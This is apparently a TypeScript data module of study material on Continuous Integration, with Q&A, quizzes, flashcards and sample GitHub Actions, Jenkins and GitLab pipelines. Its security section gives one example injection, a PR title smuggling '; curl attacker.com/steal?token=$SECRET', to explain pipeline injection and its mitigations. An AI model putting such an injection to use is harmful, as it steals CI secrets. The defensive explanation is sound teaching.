import type { TopicContent } from "../types";

export const continuousIntegration: TopicContent = {
  quickSummary: [
    "Continuous Integration (CI) is the practice of merging developer work into a shared mainline frequently — at least daily — with each integration verified by an automated build and test suite.",
    "Trunk-based development maximizes CI benefits by having all developers commit to a single branch (trunk/main), using short-lived feature branches (hours to days, not weeks).",
    "Fast feedback is the core CI value: a developer should know within minutes whether their change broke the build, failed tests, or introduced regressions.",
    "CI pipelines automate compilation, linting, unit tests, integration tests, security scans, and artifact generation on every push or pull request.",
  ],
  detailed: [
    "## Core Principles of CI\n\nCI was popularized by Extreme Programming and Martin Fowler's seminal article. The key principles are: maintain a single source repository, automate the build, make the build self-testing, commit to the mainline frequently, fix broken builds immediately, keep the build fast, test in a clone of the production environment, and make it easy to get the latest deliverables. CI is a practice and a discipline, not just a tool — installing Jenkins does not mean you are doing CI if developers work on month-long branches.",

    "## Trunk-Based Development\n\nTrunk-based development is the branching model that best supports CI. All developers work on the main branch (trunk). Feature branches, if used, live for at most a day or two before merging. This minimizes merge conflicts and ensures the team is always integrating. For features that take longer, feature flags hide incomplete work. The alternative — long-lived feature branches (GitFlow-style) — leads to painful merges, delayed integration, and deferred discovery of conflicts. Studies (DORA, Accelerate) consistently show trunk-based development correlates with higher software delivery performance.",

    "## Build Pipelines and Fast Feedback\n\nA CI pipeline typically runs: (1) checkout code, (2) install dependencies, (3) lint and static analysis, (4) compile/build, (5) run unit tests, (6) run integration tests, (7) security/vulnerability scanning, (8) build artifacts/images. The pipeline should complete in under 10 minutes for the critical path (lint + unit tests). Slower stages (integration tests, E2E tests) can run in parallel or as a second tier. If the build takes 45 minutes, developers stop integrating frequently — defeating CI's purpose. Strategies for speed: parallelization, test splitting, caching dependencies, incremental builds, and running only affected tests.",

    "## What Makes a Good CI Culture\n\nCI is as much cultural as technical. The build must be treated as sacred — a red build is the team's top priority. 'It works on my machine' is not acceptable; the CI environment is the arbiter. Developers should not pile commits on top of a broken build. Code review should happen quickly (same day) to avoid blocking integration. Flaky tests must be fixed or quarantined immediately, as they erode trust in the pipeline. The team should monitor CI metrics: build duration, failure rate, time-to-fix, and queue wait time.",

    "## CI Anti-Patterns\n\nCommon anti-patterns include: long-lived feature branches that delay integration for weeks, builds that take over 30 minutes and discourage frequent commits, ignoring or disabling failing tests instead of fixing them, not running CI on pull requests (only on merge), manual build steps that are not automated, inconsistent environments between CI and production, and treating CI as 'someone else's problem' rather than a team responsibility.",
  ],
  interviewQA: [
    {
      q: "What is Continuous Integration and why is it important?",
      a: "CI is the practice of frequently merging code changes into a shared mainline — ideally multiple times per day — with each merge automatically verified by building the software and running tests. It is important because it catches integration bugs early (when they are cheap to fix), reduces merge conflicts, provides fast feedback to developers, and keeps the codebase in a releasable state. Without CI, integration happens late in the cycle, leading to painful 'merge hell' and unpredictable release timelines.",
      followUps: [
        "How does CI relate to Continuous Delivery?",
        "What metrics would you use to measure CI effectiveness?",
      ],
    },
    {
      q: "Why does trunk-based development support CI better than GitFlow?",
      a: "Trunk-based development keeps branches short-lived (hours to a day), so integration happens continuously. GitFlow uses long-lived develop, release, and feature branches where code can diverge for weeks. This delays the discovery of integration issues, creates large risky merges, and means the mainline is rarely in a deployable state. The DORA research consistently shows that trunk-based development correlates with elite software delivery performance: higher deployment frequency, lower lead time, lower change failure rate.",
      followUps: [
        "How do you handle unfinished features in trunk-based development?",
        "Is GitFlow ever appropriate?",
      ],
    },
    {
      q: "How do you keep CI builds fast?",
      a: "Several strategies: run tests in parallel across multiple workers, split large test suites so each worker runs a subset, cache dependencies and build artifacts between runs, use incremental builds that only recompile changed modules, run only tests affected by the changed code (test impact analysis), separate fast unit tests (run on every push) from slow integration/E2E tests (run as a gating check before merge), and use powerful CI runner hardware. The target is under 10 minutes for the critical feedback loop.",
    },
    {
      q: "What should you do when the CI build breaks?",
      a: "Stop the line — fixing the build is the team's top priority. The developer whose commit broke the build should fix it within minutes, not hours. If a quick fix is not possible, revert the offending commit to restore green. Do not pile more commits on top of a broken build. Communicate the status to the team. After fixing, investigate whether the failure reveals a gap in local testing or a flaky test that needs attention. Track 'time to fix broken build' as a team health metric.",
    },
  ],
  followUps: [
    "Why must CI be blocking to be useful?",
    "How do you keep the pipeline under ten minutes as the suite grows?",
    "What belongs in CI versus in a pre-commit hook?",
  ],
  mcqs: [
    {
      q: "According to CI best practices, how often should developers integrate their work?",
      options: [
        "Once per sprint",
        "At least once per day",
        "Only when a feature is complete",
        "Weekly, to batch changes for efficiency",
      ],
      answerIndex: 1,
      explanation: "CI calls for frequent integration — at least daily, ideally multiple times per day — to catch conflicts early and keep the mainline stable.",
    },
    {
      q: "What is the primary risk of long-lived feature branches?",
      options: [
        "They consume too much disk space",
        "They delay integration, leading to painful merges and late defect discovery",
        "They prevent code review",
        "They make it impossible to run unit tests",
      ],
      answerIndex: 1,
      explanation: "Long-lived branches accumulate divergence from the mainline. When finally merged, conflicts are large and integration bugs surface late, when they are expensive to fix.",
    },
    {
      q: "What is a flaky test?",
      options: [
        "A test that runs too slowly",
        "A test that sometimes passes and sometimes fails without code changes",
        "A test that covers too many code paths",
        "A test written in a deprecated framework",
      ],
      answerIndex: 1,
      explanation: "Flaky tests produce non-deterministic results, eroding trust in the CI pipeline. Developers start ignoring test failures, undermining the entire CI feedback loop.",
    },
    {
      q: "Which research program consistently links trunk-based development to high software delivery performance?",
      options: ["IEEE Software Survey", "DORA / Accelerate", "Chaos Engineering Group", "CNCF Maturity Model"],
      answerIndex: 1,
      explanation: "The DORA (DevOps Research and Assessment) program, published in the book 'Accelerate' by Forsgren, Humble, and Kim, identifies trunk-based development as a key predictor of elite delivery performance.",
    },
  ],
  flashcards: [
    { front: "What does CI stand for?", back: "Continuous Integration — the practice of frequently merging code into a shared mainline with automated build and test verification." },
    { front: "What is the recommended maximum CI build time for fast feedback?", back: "Under 10 minutes for the critical path (lint, compile, unit tests). Slower stages can run in parallel or as secondary checks." },
    { front: "What is trunk-based development?", back: "A branching model where all developers commit to a single main branch, using only short-lived feature branches (hours, not weeks)." },
    { front: "What is test impact analysis?", back: "A technique that determines which tests are affected by a code change and runs only those, reducing CI execution time." },
    { front: "What is the 'stop the line' principle in CI?", back: "When the build breaks, fixing it is the team's top priority. No new work is piled on top of a broken build." },
    { front: "What are the four DORA metrics?", back: "Deployment frequency, lead time for changes, change failure rate, and time to restore service." },
    { front: "What is a CI artifact?", back: "A build output (compiled binary, Docker image, test report, coverage report) produced by the CI pipeline and stored for downstream use." },
    { front: "What is the difference between a unit test and an integration test in CI?", back: "Unit tests verify individual functions/classes in isolation (fast, no external dependencies). Integration tests verify interactions between components or with real databases/APIs (slower, more realistic)." },
  ],
  glossary: [
    { term: "Continuous Integration", definition: "The practice of frequently merging code into a shared mainline, verified by automated builds and tests." },
    { term: "Trunk-Based Development", definition: "A branching strategy where developers work on a single main branch with short-lived feature branches." },
    { term: "Build Pipeline", definition: "An automated sequence of steps (compile, test, scan, package) triggered by code changes." },
    { term: "Fast Feedback", definition: "The CI principle that developers should learn within minutes whether their change is healthy." },
    { term: "Flaky Test", definition: "A test that non-deterministically passes or fails without underlying code changes, undermining CI trust." },
    { term: "Green Build", definition: "A CI build where all steps pass, indicating the codebase is in a healthy state." },
    { term: "Test Splitting", definition: "Distributing a test suite across multiple parallel workers to reduce total execution time." },
    { term: "DORA Metrics", definition: "Four key metrics (deployment frequency, lead time, change failure rate, MTTR) that measure software delivery performance." },
  ],
  deepDive: [
    "## CI Pipeline Internals: How Runners Execute Workflows\n\nA CI system consists of a **coordinator** (scheduler/orchestrator) and one or more **runners** (agents/workers). When a webhook fires from the VCS (e.g., a GitHub `push` event), the coordinator parses the pipeline definition, builds a directed acyclic graph (DAG) of jobs, and schedules them onto available runners respecting dependency order and concurrency limits.\n\nRunners can be **ephemeral** (spun up per job, destroyed after) or **persistent** (long-lived, accepting jobs from a queue). Ephemeral runners provide perfect isolation — no state leaks between builds — but have cold-start overhead. Persistent runners are faster but require careful workspace cleanup.\n\n**Caching** is critical for performance. Most CI systems support two layers: (1) a dependency cache keyed on lockfile hashes (e.g., `node_modules` keyed on `package-lock.json` hash), and (2) a build cache for incremental compilation (e.g., Gradle build cache, Bazel remote cache). Cache invalidation strategy matters — stale caches cause subtle, hard-to-debug failures.\n\n**Artifact passing** between jobs uses a temporary object store. Job A uploads a build artifact; Job B downloads it. This is distinct from caching: artifacts are specific to a single pipeline run, while caches persist across runs.\n\n**Secrets management** injects environment variables at runtime. Secrets are masked in logs, scoped to specific branches or environments, and never stored in the pipeline definition itself. Most platforms support OIDC-based federation for cloud provider authentication, eliminating long-lived credential storage.",

    "## Parallelism, Test Splitting, and Pipeline Optimization\n\nThe single biggest lever for CI speed is **parallelism**. There are two dimensions: (1) running independent jobs concurrently (build, lint, and security scan in parallel since they do not depend on each other), and (2) splitting a single large test suite across multiple workers.\n\n**Test splitting strategies** include: round-robin (simple but unbalanced), file-based splitting (divide test files evenly), and **timing-based splitting** (use historical execution data to balance wall-clock time across workers). Timing-based splitting is the most effective — tools like `circleci tests split --split-by=timings` or `jest --shard` implement this.\n\n**Pipeline fan-out / fan-in** patterns structure complex workflows: a single build job fans out to N parallel test shards, which fan in to a single deploy-gate job. The deploy-gate only proceeds if all shards pass.\n\n**Conditional execution** skips irrelevant jobs: a docs-only change should not run the full test suite. Path filters (`on.push.paths` in GitHub Actions, `only:changes` in GitLab CI) implement this. Monorepo CI tools like Nx and Turborepo take this further with dependency-graph-aware affected detection.\n\n**Matrix builds** test across multiple dimensions (OS, language version, dependency version) by generating a Cartesian product of configurations. A 3x3 matrix spawns 9 jobs. Use `fail-fast: true` to cancel remaining matrix jobs on the first failure, or `false` to see the full failure surface.",

    "## CI Security: Supply Chain and Pipeline Hardening\n\nCI pipelines are a high-value attack target because they have write access to production artifacts and often hold deployment credentials.\n\n**Supply chain attacks** target dependencies. The 2021 Codecov breach injected malicious code into a CI bash uploader script, exfiltrating environment variables (including secrets) from thousands of CI builds. Mitigations: pin dependencies by hash (not tag), verify checksums, use lockfiles, and audit dependency updates. For GitHub Actions, pin action versions to full commit SHAs (`uses: actions/checkout@a81bbbf...`) rather than mutable tags (`@v4`).\n\n**Pipeline injection** occurs when untrusted input (PR title, branch name, issue body) is interpolated into shell commands. Example: a PR title containing `; curl attacker.com/steal?token=$SECRET` executed via `run: echo \"${{ github.event.pull_request.title }}\"`. Mitigations: use intermediate environment variables, avoid direct expression interpolation in `run` blocks, and use `actions/github-script` for complex logic.\n\n**Least privilege** applies to CI: runners should have minimal permissions, secrets should be scoped to the branches and environments that need them, and `GITHUB_TOKEN` permissions should be explicitly declared (not defaulted to write-all). Enable branch protection rules requiring CI passage before merge, and require approval for CI runs on first-time contributors' PRs."
  ],
  code: [
    {
      language: "yaml",
      caption: "GitHub Actions: Node.js CI with caching, matrix builds, and deployment gate",
      source: `name: CI Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

permissions:
  contents: read
  checks: write

env:
  NODE_VERSION: '20'

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: \${{ env.NODE_VERSION }}
          cache: 'npm'
      - run: npm ci
      - run: npm run lint
      - run: npm run typecheck

  test:
    runs-on: ubuntu-latest
    needs: [lint]
    strategy:
      matrix:
        shard: [1, 2, 3, 4]
      fail-fast: false
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: \${{ env.NODE_VERSION }}
          cache: 'npm'
      - run: npm ci
      - run: npx jest --shard=\${{ matrix.shard }}/4 --ci --coverage
      - uses: actions/upload-artifact@v4
        with:
          name: coverage-\${{ matrix.shard }}
          path: coverage/

  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm audit --audit-level=high
      - uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          severity: 'HIGH,CRITICAL'

  build:
    runs-on: ubuntu-latest
    needs: [test, security]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: \${{ env.NODE_VERSION }}
          cache: 'npm'
      - run: npm ci
      - run: npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: dist
          path: dist/
          retention-days: 7`
    },
    {
      language: "groovy",
      caption: "Jenkinsfile: Declarative pipeline with parallel stages and Docker agent",
      source: `pipeline {
    agent none

    environment {
        REGISTRY = 'registry.example.com'
        IMAGE    = 'myapp'
    }

    stages {
        stage('Checkout') {
            agent any
            steps {
                checkout scm
                stash includes: '**', name: 'source'
            }
        }

        stage('Quality Gates') {
            parallel {
                stage('Lint') {
                    agent { docker { image 'node:20-alpine' } }
                    steps {
                        unstash 'source'
                        sh 'npm ci && npm run lint'
                    }
                }
                stage('Unit Tests') {
                    agent { docker { image 'node:20-alpine' } }
                    steps {
                        unstash 'source'
                        sh 'npm ci && npm test -- --ci --coverage'
                    }
                    post {
                        always {
                            junit 'reports/junit.xml'
                            publishHTML(target: [
                                reportName: 'Coverage',
                                reportDir:  'coverage/lcov-report',
                                reportFiles: 'index.html'
                            ])
                        }
                    }
                }
                stage('Security Scan') {
                    agent { docker { image 'aquasec/trivy:latest' } }
                    steps {
                        unstash 'source'
                        sh 'trivy fs --severity HIGH,CRITICAL --exit-code 1 .'
                    }
                }
            }
        }

        stage('Build & Push Image') {
            agent any
            when { branch 'main' }
            steps {
                unstash 'source'
                sh 'npm ci && npm run build'
                script {
                    def tag = "\${env.REGISTRY}/\${env.IMAGE}:\${env.BUILD_NUMBER}"
                    sh "docker build -t \${tag} ."
                    withCredentials([usernamePassword(
                        credentialsId: 'registry-creds',
                        usernameVariable: 'USER',
                        passwordVariable: 'PASS'
                    )]) {
                        sh "echo \$PASS | docker login \${env.REGISTRY} -u \$USER --password-stdin"
                        sh "docker push \${tag}"
                    }
                }
            }
        }
    }

    post {
        failure {
            slackSend channel: '#ci-alerts',
                      color: 'danger',
                      message: "Build FAILED: \${env.JOB_NAME} #\${env.BUILD_NUMBER}"
        }
        success {
            slackSend channel: '#ci-alerts',
                      color: 'good',
                      message: "Build PASSED: \${env.JOB_NAME} #\${env.BUILD_NUMBER}"
        }
    }
}`
    },
    {
      language: "yaml",
      caption: "GitLab CI: Multi-stage pipeline with caching, rules, and environment deploy",
      source: `stages:
  - validate
  - test
  - build
  - deploy

variables:
  NODE_IMAGE: node:20-alpine

default:
  cache:
    key:
      files:
        - package-lock.json
    paths:
      - node_modules/

lint:
  stage: validate
  image: \$NODE_IMAGE
  script:
    - npm ci --cache .npm
    - npm run lint
    - npm run typecheck
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH == "main"

unit-tests:
  stage: test
  image: \$NODE_IMAGE
  parallel: 4
  script:
    - npm ci --cache .npm
    - npx jest --shard=$CI_NODE_INDEX/$CI_NODE_TOTAL --ci
  coverage: '/All files.*?(\d+\\.?\\d+)%/'
  artifacts:
    reports:
      junit: reports/junit.xml
      coverage_report:
        coverage_format: cobertura
        path: coverage/cobertura-coverage.xml

build:
  stage: build
  image: \$NODE_IMAGE
  script:
    - npm ci --cache .npm
    - npm run build
  artifacts:
    paths:
      - dist/
    expire_in: 1 week
  rules:
    - if: $CI_COMMIT_BRANCH == "main"

deploy-staging:
  stage: deploy
  needs: [build]
  environment:
    name: staging
    url: https://staging.example.com
  script:
    - ./scripts/deploy.sh staging
  rules:
    - if: $CI_COMMIT_BRANCH == "main"`
    }
  ],
  comparison: {
    columns: ["Feature", "GitHub Actions", "Jenkins", "GitLab CI", "CircleCI"],
    rows: [
      ["Hosting Model", "SaaS (GitHub-hosted) or self-hosted runners", "Self-hosted only (controller + agents)", "SaaS (GitLab.com) or self-managed instance", "SaaS with self-hosted runner option"],
      ["Config Format", "YAML files in .github/workflows/", "Jenkinsfile (Groovy DSL) in repo root", "Single .gitlab-ci.yml in repo root", "YAML in .circleci/config.yml"],
      ["Parallelism", "Matrix strategy, concurrent jobs per plan tier", "Parallel stages, limited by executor count", "parallel keyword with CI_NODE_INDEX sharding", "Parallelism level setting, test splitting CLI"],
      ["Caching", "actions/cache with hash-based keys, automatic for setup-* actions", "Plugin-based (e.g., Job Cacher), requires configuration", "Built-in cache with key:files for lockfile hashing", "Built-in with keys, partial cache restore"],
      ["Secrets Management", "Encrypted secrets at repo/org/environment level, OIDC for cloud auth", "Credentials plugin, HashiCorp Vault integration", "CI/CD variables, masked/protected, Vault integration", "Contexts and environment variables, OIDC support"],
      ["Container Support", "Container jobs, service containers for databases", "Docker agent, Kubernetes plugin, Docker-in-Docker", "Native Docker executor, services keyword for sidecars", "Docker executor is default, remote Docker for DinD"],
      ["Ecosystem / Plugins", "17,000+ Marketplace actions, reusable workflows", "1,800+ plugins, most extensible but maintenance burden", "Built-in SAST/DAST/container scanning, Auto DevOps", "Orbs marketplace for reusable config packages"],
      ["Pricing (Open Source)", "Free for public repos (unlimited minutes)", "Free (open-source, self-hosted)", "400 CI/CD minutes/month on free tier", "Free tier with limited credits/month"],
      ["Monorepo Support", "Path filters on triggers, no built-in dependency graph", "Multibranch + shared libraries, manual path filtering", "rules:changes for path-based triggers", "Dynamic config with setup workflows, path filtering"],
      ["Ease of Setup", "Zero setup for GitHub repos, YAML-first", "Requires server installation, Groovy learning curve", "Built into GitLab, single YAML file", "Quick start with config wizard, good docs"]
    ]
  },
  diagrams: [
    {
      title: "CI Pipeline Flow",
      kind: "flow",
      caption: "End-to-end flow from code push through parallel lint, test shards, security scan, and artifact build with gating at each stage.",
      mermaid: `flowchart TD
    A["Developer Push or PR"] --> B["Webhook to CI Coordinator"]
    B --> C["Parse Pipeline DAG"]
    C --> D["Checkout and Cache Restore"]
    D --> E["Lint and Typecheck"]
    D --> F["Unit Tests Shard 1"]
    D --> G["Unit Tests Shard 2"]
    D --> H["Security Scan"]
    E --> I{All Pass?}
    F --> I
    G --> I
    H --> I
    I -- No --> J["Notify Developer\nBlock PR merge"]
    I -- Yes --> K["Build Artifact"]
    K --> L["Push to Registry"]
    L --> M["Update Commit Status\nAllow PR merge"]`,
    },
    {
      title: "CI Commit to Feedback Sequence",
      kind: "sequence",
      caption: "Timeline from developer push through coordinator scheduling, runner execution, and status reporting back to the developer.",
      mermaid: `sequenceDiagram
    participant Dev as Developer
    participant VCS as GitHub or GitLab
    participant CI as CI Coordinator
    participant R1 as Runner 1
    participant R2 as Runner 2
    participant Cache as Cache Store

    Dev->>VCS: git push
    VCS->>CI: Webhook - push event
    CI->>CI: Parse pipeline DAG
    CI->>R1: Schedule lint job
    CI->>R2: Schedule test job
    R1->>Cache: Restore node_modules
    R2->>Cache: Restore node_modules
    R1->>R1: Run lint and typecheck
    R2->>R2: Run unit tests
    R1-->>CI: Job result pass
    R2-->>CI: Job result pass
    CI->>CI: All dependencies met
    CI->>R1: Schedule build job
    R1->>R1: Build Docker image
    R1-->>CI: Artifact pushed
    CI->>VCS: Report commit status green
    VCS-->>Dev: Build passed notification`,
    },
    {
      title: "CI System Architecture",
      kind: "architecture",
      caption: "Components of a CI system showing the coordinator, runner pool, cache store, artifact registry, and secret management.",
      mermaid: `flowchart TB
    subgraph VCS["Version Control"]
        Repo["Git Repository"]
        Webhook["Webhook Events"]
    end

    subgraph Coordinator["CI Coordinator"]
        Scheduler["Job Scheduler"]
        DAG["Pipeline DAG Builder"]
        StatusAPI["Status API"]
    end

    subgraph Runners["Runner Pool"]
        ER["Ephemeral Runners\nclean per job"]
        PR["Persistent Runners\ncached warm"]
    end

    subgraph Storage["Storage Layer"]
        ArtReg["Artifact Registry\nDocker ECR"]
        CacheStore["Dependency Cache\nkeyed by lockfile hash"]
        SecretMgr["Secret Manager\nscoped per environment"]
    end

    Repo --> Webhook
    Webhook --> Scheduler
    Scheduler --> DAG
    DAG --> ER
    DAG --> PR
    ER --> CacheStore
    PR --> CacheStore
    ER --> ArtReg
    ER --> SecretMgr
    Scheduler --> StatusAPI
    StatusAPI --> Repo`,
    },
    {
      title: "CI Concepts Mindmap",
      kind: "mindmap",
      caption: "Key concepts of continuous integration grouped by practice, pipeline mechanics, security, and quality culture.",
      mermaid: `mindmap
  root["Continuous Integration"]
    Practices
      Trunk-Based Development
      Frequent Small Commits
      Fix Broken Build Immediately
      No Long-Lived Branches
    Pipeline Mechanics
      Lint and Typecheck
      Unit Tests
      Integration Tests
      Security Scan
      Artifact Build
      Parallel Execution
      Dependency Caching
    Fast Feedback
      Under 10 Minute Target
      Test Splitting
      Incremental Builds
      Affected Test Detection
    Security
      Pin Actions to SHA
      Scoped Secrets
      OIDC Federation
      No Injection via PR Title
    Quality Culture
      Green Build is Sacred
      Flaky Tests Quarantined
      Team Owns the Pipeline
      Monitor Build Duration`,
    },
  ],
  animations: [
    {
      title: "Lifecycle of a CI Pipeline Run",
      steps: [
        { label: "Code Push", detail: "A developer pushes a commit or opens a pull request. The VCS sends a webhook event (e.g., push or pull_request) to the CI system." },
        { label: "Pipeline Triggered", detail: "The CI coordinator receives the webhook, parses the pipeline config file (e.g., .github/workflows/*.yml), and builds a DAG of jobs based on dependency declarations (needs/requires)." },
        { label: "Runner Assignment", detail: "Each job is queued and assigned to an available runner matching its label/tag requirements. Ephemeral runners spin up a fresh VM or container; persistent runners claim the job from a work queue." },
        { label: "Workspace Setup", detail: "The runner checks out the source code at the triggered commit SHA, restores cached dependencies (matched by lockfile hash), and pulls any artifacts from upstream jobs." },
        { label: "Job Execution", detail: "Steps execute sequentially within each job: install dependencies, run linting, execute tests, build artifacts. Each step's exit code determines pass/fail. Logs stream in real time to the CI dashboard." },
        { label: "Parallel Fan-Out", detail: "Independent jobs (lint, test shards, security scan) run concurrently across multiple runners. Matrix strategies spawn N parallel instances with different configurations (OS, language version)." },
        { label: "Results Aggregation", detail: "As jobs complete, the coordinator collects exit codes, test reports (JUnit XML), and coverage data. Downstream jobs (e.g., deploy gate) wait for all upstream dependencies to succeed." },
        { label: "Status Reporting", detail: "The CI system reports the final pipeline status back to the VCS via commit status checks or check runs. PR merge is blocked if required checks fail. Notifications fire to Slack, email, or webhooks." }
      ]
    }
  ],
  exercises: [
    "Set up a GitHub Actions workflow for a Node.js project that runs lint, unit tests (split across 3 parallel shards), and a build step. Use dependency caching and ensure the build only runs after all test shards pass.",
    "Create a Jenkinsfile with parallel stages for linting, testing, and security scanning. Use a Docker agent for each stage and configure post-build notifications to a Slack channel.",
    "Implement path-based filtering in a CI pipeline for a monorepo: changes to `packages/api/**` should trigger API tests only, changes to `packages/web/**` should trigger web tests only, and changes to `shared/**` should trigger both.",
    "Design a CI pipeline that includes a manual approval gate between the test stage and the production deployment stage. Implement environment-specific secrets and deployment URL tracking.",
    "Write a CI configuration that runs a matrix build testing your application against Node.js 18, 20, and 22 on both Ubuntu and macOS. Configure it to fail fast on the first failure and upload test results as artifacts."
  ],
  cheatSheet: [
    "CI = merge to mainline at least daily + automated build/test on every integration",
    "Keep the critical-path build under 10 minutes: parallelize, cache, split tests, run only affected tests",
    "Pin CI action/plugin versions to commit SHAs, not mutable tags, to prevent supply-chain attacks",
    "Use `needs` (GitHub Actions) / `dependencies` (GitLab CI) to define job DAGs and enable parallel execution",
    "Cache dependencies by lockfile hash; cache build outputs with content-addressable keys",
    "Flaky test? Quarantine it immediately -- never let it train the team to ignore red builds",
    "Scope secrets to specific branches/environments; prefer OIDC federation over long-lived credentials",
    "Monitor four CI health metrics: build duration (p50/p95), failure rate, time-to-fix, and queue wait time"
  ],
  revisionNotes: [
    "CI is a practice (frequent integration + automated verification), not a tool -- installing Jenkins without the discipline is not CI",
    "Trunk-based development is the branching model that maximizes CI value; long-lived branches are the primary anti-pattern",
    "The DORA/Accelerate research links trunk-based development and CI to elite software delivery performance across all four key metrics",
    "CI pipelines form a DAG of jobs: independent jobs run in parallel, dependent jobs wait for upstream success",
    "Ephemeral runners provide clean isolation per build; persistent runners trade isolation for speed (no cold start)",
    "Supply-chain security matters: pin dependencies by hash, verify checksums, scope secrets, and use OIDC over static credentials",
    "Test splitting by historical timing data is the most effective parallelization strategy for large test suites",
    "The 'stop the line' culture is non-negotiable: a broken build is the team's top priority, fix it or revert within minutes"
  ],
  resources: [
    { label: "Continuous Integration (Martin Fowler)", kind: "article", note: "The seminal article defining CI practices, principles, and anti-patterns -- the canonical reference" },
    { label: "Accelerate: The Science of Lean Software and DevOps", kind: "book", note: "Forsgren, Humble, Kim -- data-driven research linking CI, trunk-based dev, and delivery performance (DORA metrics)" },
    { label: "GitHub Actions Documentation", kind: "docs", note: "Official reference for workflow syntax, runners, caching, matrix builds, and security hardening" },
    { label: "GitLab CI/CD Documentation", kind: "docs", note: "Comprehensive guide covering pipeline configuration, caching, artifacts, environments, and Auto DevOps" },
    { label: "Continuous Delivery (Jez Humble & David Farley)", kind: "book", note: "The foundational book on build pipelines, deployment automation, and the practices that extend CI into CD" }
  ],
};
